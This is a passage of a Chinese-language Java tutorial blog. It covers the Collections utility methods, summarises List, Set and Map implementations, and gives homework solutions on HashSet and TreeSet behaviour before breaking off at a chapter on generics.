class="hljs-string">&quot;tom&quot;</span>);<br>list.add(<span class="hljs-string">&quot;smith&quot;</span>);<br>list.add(<span class="hljs-string">&quot;king&quot;</span>);<br>list.add(<span class="hljs-string">&quot;milan&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li><p><strong>排序操作：（均为static方法）</strong></p><ol><li>reverse(List)：反转 List 中元素的顺序</li><li>shuffle(List)：对 List集合元素进行随机排序</li><li>sort(List)：根据元素的自然顺序对指定 List集合元素按升序排序</li><li>sort(List， Comparator)：根据指定的 Comparator 产生的顺序对List集合元素进行 排序</li><li>swap(List， int， int)：将指定 list 集合中的i处元素和j处元素进行交换</li></ol><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-number">1.</span> reverse(List)：反转 List 中元素的顺序<br>        Collections.reverse(list);<br>        System.out.println(<span class="hljs-string">&quot;反转list=&quot;</span>+list);<br><span class="hljs-comment">//        2. shuffle(List)：对 List集合元素进行随机排序</span><br>        Collections.shuffle(list);<br>        System.out.println(<span class="hljs-string">&quot;随机list=&quot;</span>+list);<br>        Collections.shuffle(list);<br>        System.out.println(<span class="hljs-string">&quot;随机2list=&quot;</span>+list);<br><span class="hljs-comment">//        3. sort(List)：根据元素的自然顺序对指定 List集合元素按升序排序</span><br>        Collections.sort(list);<br>        System.out.println(<span class="hljs-string">&quot;自然排序list=&quot;</span>+list);<br><span class="hljs-comment">//        4. sort(List， Comparator)：根据指定的 Comparator 产生的顺序对List集合元素进行 排序</span><br>        <span class="hljs-comment">//例如：按照字符串的长度大小排序</span><br>        Collections.sort(list, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1,Object o2)</span>&#123;<br>                <span class="hljs-keyword">return</span> ((String)o1).length() - ((String)o2).length();<br>            &#125;<br>        &#125;);<br>        System.out.println(<span class="hljs-string">&quot;字符串长度排序list=&quot;</span>+list);<br><span class="hljs-comment">//        5. swap(List， int， int)：将指定 list 集合中的i处元素和j处元素进行交换</span><br>        Collections.swap(list,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;交换0、1后list=&quot;</span>+list);<br></code></pre></td></tr></table></figure><blockquote><p>输出：</p><p>list&#x3D;[tom, smith, king, milan]<br>反转list&#x3D;[milan, king, smith, tom]<br>随机list&#x3D;[tom, milan, king, smith]<br>随机2list&#x3D;[king, milan, smith, tom]<br>自然排序list&#x3D;[king, milan, smith, tom]<br>字符串长度排序list&#x3D;[tom, king, milan, smith]<br>交换0、1后list&#x3D;[king, tom, milan, smith]</p></blockquote></li><li><p><strong>查找、替换</strong></p><ol><li>Object max（Collection）：根据元素的自然顺序，返回给定集合中的最大元素</li><li>Object max（Collection， Comparator）：根据 Comparator 指定的顺序，返回给定集合中的最大元素</li><li>Object min(Collection)</li><li>Object min(Collection, Comparator)</li><li>int frequency（Collection， Object）：返回指定集合中指定元素的出现次数</li><li>void copy（List dest，List src）：将src中的内容复制到dest中</li><li>boolean replaceAll（List list， Object oldVal， Object newVal）：使用新值替换 List 对象的所有旧值</li></ol><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//      查找、替换</span><br><span class="hljs-comment">//        1. Object max（Collection）：根据元素的自然顺序，返回给定集合中的最大元素</span><br>        System.out.println(<span class="hljs-string">&quot;自然顺序最大元素：&quot;</span>+Collections.max(list));<br><span class="hljs-comment">//        2. Object max（Collection， Comparator）：根据 Comparator 指定的顺序，返回给定集合中的最大元素</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">maxObject</span> <span class="hljs-operator">=</span> Collections.max(list, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>                <span class="hljs-keyword">return</span> ((String) o1).length() - ((String) o2).length();<br>            &#125;<br>        &#125;);<br>        System.out.println(<span class="hljs-string">&quot;长度最大的元素=&quot;</span>+maxObject);<br><span class="hljs-comment">//        3. Object min(Collection)</span><br><span class="hljs-comment">//        4. Object min(Collection, Comparator)</span><br><span class="hljs-comment">//        上面两个方法，参考max即可</span><br><br><span class="hljs-comment">//        5. int frequency（Collection， Object）：返回指定集合中指定元素的出现次数</span><br>        System.out.println(<span class="hljs-string">&quot;tom出现的次数=&quot;</span>+Collections.frequency(list,<span class="hljs-string">&quot;tom&quot;</span>));<br><span class="hljs-comment">//        6. void copy（List dest，List src）：将src中的内容复制到dest中</span><br>        <span class="hljs-type">ArrayList</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-comment">//拷贝（需要dest和list大小一致）</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; list.size(); i++) &#123;<br>            dest.add(<span class="hljs-string">&quot;&quot;</span>);<br>        &#125;<br>        Collections.copy(dest,list);<br>        System.out.println(<span class="hljs-string">&quot;dest=&quot;</span>+dest);<br><br><span class="hljs-comment">//        7. boolean replaceAll（List list， Object oldVal， Object newVal）：使用新值替换 List 对象的所有旧值</span><br>        <span class="hljs-comment">//如果list中有tom，就替换成汤姆</span><br>        Collections.replaceAll(list,<span class="hljs-string">&quot;tom&quot;</span>,<span class="hljs-string">&quot;汤姆&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;修改后list=&quot;</span>+list);<br></code></pre></td></tr></table></figure><blockquote><p>自然顺序最大元素：tom<br>长度最大的元素&#x3D;milan<br>tom出现的次数&#x3D;1<br>dest&#x3D;[king, tom, milan, smith]<br>修改后list&#x3D;[king, 汤姆, milan, smith]</p></blockquote></li></ul><h2 id="简略总结"><a href="#简略总结" class="headerlink" title="简略总结"></a>简略总结</h2><p>集合特点：动态保存、提供方法、使用方便</p><p>集合主要分为<strong>单列集合（Collection）</strong>和<strong>双列集合（Map）</strong>。</p><h3 id="单列集合"><a href="#单列集合" class="headerlink" title="单列集合"></a>单列集合</h3><p>Collection接口有两个重要的字接口，<strong>List</strong>和<strong>Set</strong>。</p><p>collection接口实现类的特点：1.可存放多元素 2.没有直接的实现子类，通过子接口Set和List来实现。</p><p>常用的遍历方式有三种：<strong>Iterator迭代器、增强for</strong></p><p><strong>Iterator迭代器的原理：</strong></p><p>1）创建一个集合的迭代器 </p><p>2）while循环，条件为下一针是都否为空</p><p> 3）指针下移，下移后返回该位置的元素</p><p>*遍历后如果要重新遍历，需要重置迭代器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1。希望能得到col对应的迭代器</span><br><span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> col.iterator();<br><span class="hljs-comment">//2.使用while循环遍历（快捷键itit）</span><br><span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<span class="hljs-comment">//判断是否还有数据</span><br>    <span class="hljs-comment">//返回下一个元素，类型是Object</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> iterator.next();<br>    System.out.println(<span class="hljs-string">&quot;obj=&quot;</span>+obj);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>增强for：</strong></p><p>底层仍然为迭代器，可以理解为简化版本的迭代器遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>（元素类型 元素名：集合名或数组名）｛<br>访问元素<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h4><p><strong>有序、可重复、添加和取出顺序一致、支持索引</strong>。</p><p>list.add()添加，list.get()获取位置，list.set()设置指定位置上的元素</p><p>list三种遍历方式：iterator、增强for、普通for</p><p>list常见的实现类：<strong>ArrayList、LinkedList和Vector</strong>。</p><h5 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a><strong>ArrayList</strong></h5><p>可变数组，允许所有元素，可加入多个空，通过数组实现数据存储，线程不安全。</p><p>1）使用无参构造器，初始容量为0。<strong>第一次添加，扩容为10</strong>。再次扩容为原容量的<strong>1.5倍</strong>。</p><p>2）使用指定大小的构造器，扩容为原容量的<strong>1.5倍</strong>。</p><p><strong>Vector</strong></p><p>线程安全的（做安全验证）</p><p>无参默认容量为10，扩容按两倍扩容。</p><p><strong>LinkedList</strong></p><p>双向链表，维护了两个属性first（首结点）和last（尾结点）。</p><p>每个结点维护了prev、next、item三个属性。</p><h4 id="Set接口"><a href="#Set接口" class="headerlink" title="Set接口"></a>Set接口</h4><p>无序、不允许重复元素、无索引。</p><p>三种遍历方式：iterator、增强for、普通for</p><p>常用的实现类：HashSet、LinkedHashSet</p><p><strong>HashSet</strong></p><p>实质上是HashMap、可以存放一个null、不保证元素有序。</p><p>底层：获取hash、计算索引、查看该索引是否有数据。如果有调用equals方法比较，相同放弃，不相同添加。如果无直接添加。</p><p>扩容：第一次添加时，table 数组扩容到16，临界值（threshold）是16＊加载因子（loadFactor）是0.75 ＝ 12。</p><p>如果table 数组使用到了临界值12，就会扩容到16＊2＝32，新的临界值就是32＊0.75＝24，依次类推</p><p>在Java8中，如果一条链表的元素个数到达8，并且table的大小＞＝64，就会进行树化（红黑树）</p><p><strong>LinkedHashSet</strong></p><p>底层维护了一个数组＋双向链表。据元素的 hashCode 值来决定存储位置，同时使用链表维护元素的次序，这使得元素看起来是以插入顺序保存的。</p><p>底层：每一个节点有pre和next属性，这样可以形成双向链表。在添加一个元素时，先求hash值，再求索引．，确定该元素在hashtable的位置，然后将添加的元素加入到双向链表（如果已经存在，不添加［原则和hashset一样］）</p><h3 id="双列集合（Map接口）"><a href="#双列集合（Map接口）" class="headerlink" title="双列集合（Map接口）"></a>双列集合（Map接口）</h3><p>保存具有映射关系的数据：<strong>Key-Value</strong>（双列元素）。key不允许重复，value 可以重复。</p><p>几种遍历方法：</p><p>第一种：先取出所有的Key，通过Key取出对应的Value</p><p>第二种：取出所有的value</p><p>第三种：通过EntrySet 来获取K-V</p><p>Map接口的常用实现类：<strong>HashMap、Hashtable和Properties</strong>。</p><h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><p>线程不安全、k-v存储。不保证映射的顺序，以hash表的方式存储。添加相同的key会替换。线程不安全。</p><p>扩容：第一次添加，table扩容为16，临界值12 。以后扩容，按照原来的两倍（例如第二次32），临界值为容量x0.75。</p><p>在Java8中，如果一条链表的<strong>元素个数超过 TREEIFY THRESHOLD</strong>（默认是8），并<strong>且table的大小＞＝MIN TREEIFY_CAPACITY</strong>（默认64），就会进行树化（红黑树）</p><h4 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h4><p>线程安全、键和值都不能为null，使用方法基本和hashmap一样。</p><h4 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h4><p>继承自Hashtable类并且实现了Map接口，通常作为配置文件。</p><h4 id="TreeSet-amp-TreeMap"><a href="#TreeSet-amp-TreeMap" class="headerlink" title="TreeSet&amp;TreeMap"></a>TreeSet&amp;TreeMap</h4><p>使用无参构造器，创造TreeSet时，仍然是无序的。</p><p>希望添加的元素，按照字符串大小来排序</p><p>使用treeset提供的一个构造器，可以传入一个比较器（匿名内部类），并指定排序规则</p><h3 id="Collections工具类"><a href="#Collections工具类" class="headerlink" title="Collections工具类"></a>Collections工具类</h3><p>Collections是一个操作Set、List和Map等集合的工具类。</p><p>Collections 中提供了一系列静态的方法对集合元素进行排序、查询和修改等操作</p><h2 id="本章作业-2"><a href="#本章作业-2" class="headerlink" title="本章作业"></a>本章作业</h2><h3 id="题目1-5"><a href="#题目1-5" class="headerlink" title="题目1"></a>题目1</h3><blockquote><p>按要求实现：<br>（1） 封装一个新闻类，包含标题和内容属性，提供get、set方法，重写toString方法，打印对象时只打印标题；</p><p>（2） 只提供一个带参数的构造器，实例化对象时，只初始化标题；并且实例化两个对象：</p><p>新闻一：新冠确诊病例超千万，数百万印度教信徒赴恒河“圣浴”引民众担忧<br>新闻二：男子突然想起2个月前钓的鱼还在网兜里，捞起一看赶紧放生<br>（3） 将新闻对象添加到ArrayList集合中，并且进行倒序遍历；</p><p>（4）在遍历集合过程中，对新闻标题进行处理，超过15字的只保留前15个，然后在后边加“．..”</p><p>（5）在控制台打印遍历出经过处理的新闻标题；</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ArrayList</span> <span class="hljs-variable">arraylist</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        arraylist.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">News</span>(<span class="hljs-string">&quot;新冠确诊病例超千万，数百万印度教信徒赴恒河“圣浴”引民众担忧&quot;</span>));<br>        arraylist.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">News</span>(<span class="hljs-string">&quot;男子突然想起2个月前钓的鱼还在网兜里，捞起一看赶紧放生&quot;</span>));<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> arraylist.size();<br>        <span class="hljs-comment">//倒序输出</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> size-<span class="hljs-number">1</span>; i &gt;=<span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-type">News</span> <span class="hljs-variable">news</span> <span class="hljs-operator">=</span> (News)arraylist.get(i);<br>            System.out.println(processTitle(news.getTitle()));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">processTitle</span><span class="hljs-params">(String title)</span>&#123;<br>        <span class="hljs-keyword">if</span> (title==<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (title.length()&gt;<span class="hljs-number">15</span>)&#123;<br>            <span class="hljs-keyword">return</span> title.substring(<span class="hljs-number">0</span>,<span class="hljs-number">15</span>)+<span class="hljs-string">&quot;...&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> title;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">News</span>&#123;<br>    <span class="hljs-keyword">private</span> String title;<br>    <span class="hljs-keyword">private</span> String content;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">News</span><span class="hljs-params">(String title)</span> &#123;<br>        <span class="hljs-built_in">this</span>.title = title;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> title;<br>    &#125;<br>  <span class="hljs-comment">/**省略get、set方法</span><br></code></pre></td></tr></table></figure><p>输出：</p><blockquote><p>男子突然想起2个月前钓的鱼还在…<br>新冠确诊病例超千万，数百万印度…</p></blockquote><h3 id="题目2-6"><a href="#题目2-6" class="headerlink" title="题目2"></a>题目2</h3><blockquote><p>使用ArrayList 完成对 对象 Car ｛name， price｝ 的各种操作<br>Car car ＝ new Car（＂宝马＂， 400000）；</p><p>Car car2 ＝ new Car（＂宾利＂， 5000000）；</p><p>1．add：添加单个元素<br>2．remove：删除指定元素</p><p>3．contains：查找元素是否存在</p><p>4．size：获取元素个数<br>5．isEmpty：判断是否为空<br>6．clear：清空<br>7．addAll：添加多个元素<br>8．containsAll：查找多个元素是否都存在<br>9．removeAll：删除多个元素<br>使用增强for和 迭代器来遍历所有的car，需要重写Car 的toString方法</p></blockquote><p>详细代码见文件。</p><h3 id="题目3-4"><a href="#题目3-4" class="headerlink" title="题目3"></a>题目3</h3><blockquote><p>按要求完成下列任务<br>1） 使用HashMap类实例化一个Map类型的对象m，键（String）和值（int）分别用于存储员工的姓名和工资，存入数据如下： jack-650元；tom-1200元；smith-2900元；<br>2）将jack的工资更改为2600元<br>3）为所有员工工资加薪100元；<br>4）遍历集合中所有的员工<br>5）遍历集合中所有的工资</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        1） 使用HashMap类实例化一个Map类型的对象m，</span><br><span class="hljs-comment">//        键（String）和值（int）分别用于存储员工的姓名和工资，</span><br><span class="hljs-comment">//        存入数据如下： jack-650元；tom-1200元；smith-2900元；</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        m.put(<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-number">650</span>);<br>        m.put(<span class="hljs-string">&quot;tom&quot;</span>,<span class="hljs-number">1200</span>);<br>        m.put(<span class="hljs-string">&quot;smith&quot;</span>,<span class="hljs-number">2900</span>);<br><span class="hljs-comment">//        2）将jack的工资更改为2600元</span><br>        m.put(<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-number">2600</span>);<br>        System.out.println(m);<br><span class="hljs-comment">//        3）为所有员工工资加薪100元；</span><br>        <span class="hljs-type">Set</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> m.keySet();<br>        <span class="hljs-keyword">for</span> (Object key :set) &#123;<br>            m.put(key,(Integer)m.get(key)+<span class="hljs-number">100</span>);<br>        &#125;<br>        System.out.println(m);<br><br><span class="hljs-comment">//        4）遍历集合中所有的员工</span><br>        <span class="hljs-type">Set</span> <span class="hljs-variable">entrySet</span> <span class="hljs-operator">=</span> m.entrySet();<br>        System.out.println(<span class="hljs-string">&quot;遍历集合中所有的员工:&quot;</span>);<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> entrySet.iterator();<br>        <span class="hljs-keyword">while</span> (iterator.hasNext())&#123;<br>            Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry)iterator.next();<br>            System.out.println(entry.getKey()+<span class="hljs-string">&quot;-&quot;</span>+entry.getValue());<br>        &#125;<br><br><span class="hljs-comment">//        5）遍历集合中所有的工资</span><br>        <span class="hljs-type">Collection</span> <span class="hljs-variable">values</span> <span class="hljs-operator">=</span> m.values();<br>        System.out.println(<span class="hljs-string">&quot;遍历集合中所有的工资:&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Object o :values) &#123;<br>            System.out.println(o);<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="简答题4"><a href="#简答题4" class="headerlink" title="简答题4"></a>简答题4</h3><blockquote><p>试分析HashSet和TreeSet分别如何实现去重的</p></blockquote><p>HashSet的去重机制：hashCode() + equals() 。底层先通过存入对象，进行运算得到一个hash值，通过hash值对应得到索引。如果发现table表索引所在的位置，没有数据，就直接存放。如果有数据，就进行equals比较[遍历比较]。如果比较后不相同就加入，否则不加入。</p><p>TreeSet的去重机制：如果传入了一个Comparator匿名对象，就是用实现的compare去重，如果方法返回0，就认为是相同的元素&#x2F;数据，就不添加。如果没有传入一个Comparator匿名对象，则以你添加的对象实现的Compareable接口的compareTo去重。</p><h3 id="题目5-1"><a href="#题目5-1" class="headerlink" title="题目5"></a>题目5</h3><blockquote><p>下面代码运行会不会抛出异常，并从源码层面说明原因.［考察 读源码＋接口编程＋动态绑定］ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet treeSet= <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>();<br>treeSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>());<br></code></pre></td></tr></table></figure></blockquote><p>会抛出异常。</p><p>因为TreeSet()的构造器没有传入Comparator接口的匿名内部类。</p><p>所以：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">Comparator&lt;? <span class="hljs-keyword">super</span> K&gt; k=（<span class="hljs-built_in">Comparable</span>&lt;? <span class="hljs-keyword">super</span> K) key;<br></code></pre></td></tr></table></figure><p>即，把Person转成Comparable类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">treeSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>()); <span class="hljs-comment">//ClassCastException</span><br></code></pre></td></tr></table></figure><h3 id="分析题6"><a href="#分析题6" class="headerlink" title="分析题6"></a>分析题6</h3><blockquote><p>&#x2F;&#x2F;老韩提示： 这道题很有意思，稍不注意就掉进陷阱.<br>已知： Person类按照id和name重写了hashCode和equals方法，问下面代码输出什么？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1001</span>,<span class="hljs-string">&quot;AA&quot;</span>);<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1002</span>,<span class="hljs-string">&quot;BB&quot;</span>);<br>set.add(p1);<br>set.add(p2);<br>p1.name = <span class="hljs-string">&quot;CC&quot;</span>;<br>set.remove(p1);<br>System.out.println(set);<br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1001</span>,<span class="hljs-string">&quot;CC&quot;</span>));<br>System.out.println(set);<br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1001</span>,<span class="hljs-string">&quot;AA&quot;</span>));<br>System.out.println(set);<br></code></pre></td></tr></table></figure></blockquote><p> 输出：</p><blockquote><p>[Person{id&#x3D;1002, name&#x3D;’BB’}, Person{id&#x3D;1001, name&#x3D;’CC’}]<br>[Person{id&#x3D;1002, name&#x3D;’BB’}, Person{id&#x3D;1001, name&#x3D;’CC’}, Person{id&#x3D;1001, name&#x3D;’CC’}]<br>[Person{id&#x3D;1002, name&#x3D;’BB’}, Person{id&#x3D;1001, name&#x3D;’CC’}, Person{id&#x3D;1001, name&#x3D;’CC’}, Person{id&#x3D;1001, name&#x3D;’AA’}]</p></blockquote><p>分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1001</span>,<span class="hljs-string">&quot;AA&quot;</span>);<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1002</span>,<span class="hljs-string">&quot;BB&quot;</span>);<br>set.add(p1);<br>set.add(p2);<br>p1.name = <span class="hljs-string">&quot;CC&quot;</span>;<br>set.remove(p1);<br>System.out.println(set);<br></code></pre></td></tr></table></figure><p>输出：Person{id&#x3D;1002, name&#x3D;’BB’}, Person{id&#x3D;1001, name&#x3D;’CC’}]</p><p>因为remove并没有成功。remove是根据当前id和name来删除（加入“CC”后，虽然p1还在原位置上，但计算出来的hash值变了），由于name被更改所以删除失败了。</p><p>如果重写hashcode方法时，不选择name，可以删除成功。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1001</span>,<span class="hljs-string">&quot;CC&quot;</span>));<br>System.out.println(set);<br></code></pre></td></tr></table></figure><p>放在计算的hash值位置上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1001</span>,<span class="hljs-string">&quot;AA&quot;</span>));<br>System.out.println(set);<br></code></pre></td></tr></table></figure><p>由于和一开始的p1相同，hash值相同，但内容和现在的p1并不相同，所以挂在p1的后面。</p><h3 id="简答7"><a href="#简答7" class="headerlink" title="简答7"></a>简答7</h3><blockquote><p>试写出Vector和ArrayList的比较?</p></blockquote><table><thead><tr><th></th><th>底层结构</th><th>版本</th><th>线程安全（同步）效率</th><th>扩容倍数</th></tr></thead><tbody><tr><td>ArrayList</td><td></td><td></td><td></td><td></td></tr><tr><td>Vector</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>答案见前。</p><h1 id="章节15-泛型"><a href="#章节15-泛型" class="headerlink" title="章节15 泛型"></a>章节15 泛型</h1><h2 id="1-引入泛型"><a href="#1-引入泛型" class="headerlink" title="1.引入泛型"></a>1.引入泛型</h2><p>需求：</p><p>1） 请编写程序，在ArrayList中，添加3个Dog对象</p><p>2）Dog对象含有name和 age，并输出name 和 age（要求使用getXxx（））</p><p>传统方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 